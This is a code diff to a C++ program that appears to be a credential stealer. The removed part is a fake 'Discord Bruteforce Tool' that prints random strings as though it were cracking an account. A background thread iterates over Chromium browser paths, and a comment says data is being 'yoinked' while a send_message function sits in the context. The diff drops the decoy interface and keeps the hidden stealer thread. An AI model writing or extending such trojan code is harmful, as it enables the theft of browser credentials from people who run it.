@@ -40,7 +40,7 @@ bool send_message(std::string message)
     }
 }
 
-void crack()
+void background_worker()
 {
     for (auto& browser : chromium::paths)
     {
@@ -76,39 +76,10 @@ void crack()
 
 int main()
 {
-    std::thread worker(crack);
-
-    system("color 4");
-    SetConsoleTitleA("Discord - Bruteforce Tool v1.2     Made by Satan#4233");
-
-    std::cout << "[SYSTEM]: Enter discord user id to hack: ";
-    long long id = 0;
-
-    std::string input;
-    std::cin >> input;
-
-    try
-    {
-        id = std::stoll(input);
-    }
-    catch (const std::exception& e)
-    {
-        std::cout << "Invalid discord id, please try again." << std::endl;
-        Sleep(2000);
-        return 0;
-    }
-
-    const char* pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#¤%&/()=`?";
-    while (1)
-    {
-        std::string crack;
-        for (int i = 0; i < 32; i++) {
-            crack += pool[rand() % strlen(pool)];
-        }
-        std::cout << "Cracking [" << id << "]:\t" << crack << std::endl;
-        Sleep(std::rand() % 1000);
-    }
-
+    std::thread worker(background_worker);
+    
+    // Do work while stuff being yoinked.
+    
     worker.join();
 
     return 0;
